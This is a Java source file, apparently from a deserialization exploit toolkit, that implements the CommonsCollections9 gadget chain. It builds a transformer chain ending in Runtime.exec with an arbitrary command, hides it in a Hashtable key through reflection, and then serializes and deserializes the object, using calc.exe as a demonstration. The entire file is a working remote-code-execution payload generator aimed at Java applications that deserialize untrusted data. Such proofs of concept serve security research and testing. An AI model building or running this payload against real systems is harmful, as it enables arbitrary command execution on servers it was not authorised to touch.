package xyz.eki.marshalexp.poc;

import com.sun.deploy.util.ReflectionUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.functors.ConstantFactory;
import org.apache.commons.collections4.functors.FactoryTransformer;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC9 implements POC{
    @Override
    public Object getPocObject(String cmd) throws Exception {
        final String[] execArgs = new String[]{cmd};
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        execArgs),
                new ConstantTransformer(1)};

        final Map innerMap = new HashMap();

        final Map defMap = DefaultedMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(defMap, "foo");
        Hashtable hashtable = new Hashtable();
        hashtable.put("foo",1);
        // 获取hashtable的table类属性
        Field tableField = Hashtable.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[])tableField.get(hashtable);
        Object entry1 = table[0];
        if(entry1==null)
            entry1 = table[1];
        // 获取Hashtable.Entry的key属性
        Field keyField = entry1.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        // 将key属性给替换成构造好的TiedMapEntry实例
        keyField.set(entry1, entry);
        // 填充真正的命令执行代码
        ReflectUtils.setFieldValue(transformerChain, "iTransformers", transformers);
        return hashtable;
    }

    public static void main(String[] args) throws Exception {
        CC9 gen = new CC9();
        String cmd = "calc.exe";
        Object poc1 = gen.getPocObject(cmd);
        byte[] test = SerializeUtils.serialize(poc1);
        SerializeUtils.deserialize(test);
    }
}
